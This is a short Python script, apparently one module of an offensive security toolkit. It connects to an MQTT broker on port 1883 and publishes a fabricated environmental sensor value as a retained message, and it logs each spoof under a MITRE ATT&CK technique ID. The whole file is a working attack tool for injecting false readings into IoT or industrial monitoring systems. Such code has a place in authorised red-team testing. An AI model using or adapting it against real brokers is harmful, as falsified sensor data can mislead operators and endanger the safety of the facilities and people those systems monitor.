#!/usr/bin/env python3
# modules/attacks/environment_sensor_spoofer.py

import argparse
import time
import json
import os
from datetime import datetime
import paho.mqtt.client as mqtt

LOG_FILE = "results/env_sensor_spoof_log.json"
MITRE_TTP = "T1557.001"

def log_event(broker, topic, value):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "broker": broker,
            "topic": topic,
            "spoofed_value": value,
            "ttp": MITRE_TTP
        }) + "\n")

def spoof_mqtt(broker, topic, value):
    print(f"[*] Publishing spoofed sensor value to MQTT {broker} on topic {topic}...")
    client = mqtt.Client()
    try:
        client.connect(broker, 1883, 60)
        client.publish(topic, payload=value, qos=0, retain=True)
        client.disconnect()
        log_event(broker, topic, value)
        print("[✓] Spoof successful.")
    except Exception as e:
        print(f"[!] MQTT spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof environmental sensor values via MQTT")
    parser.add_argument("--broker", required=True, help="MQTT broker IP or hostname")
    parser.add_argument("--topic", required=True, help="MQTT topic for sensor value")
    parser.add_argument("--value", required=True, help="Fake sensor value to inject (e.g. '52.1')")
    args = parser.parse_args()
    spoof_mqtt(args.broker, args.topic, args.value)
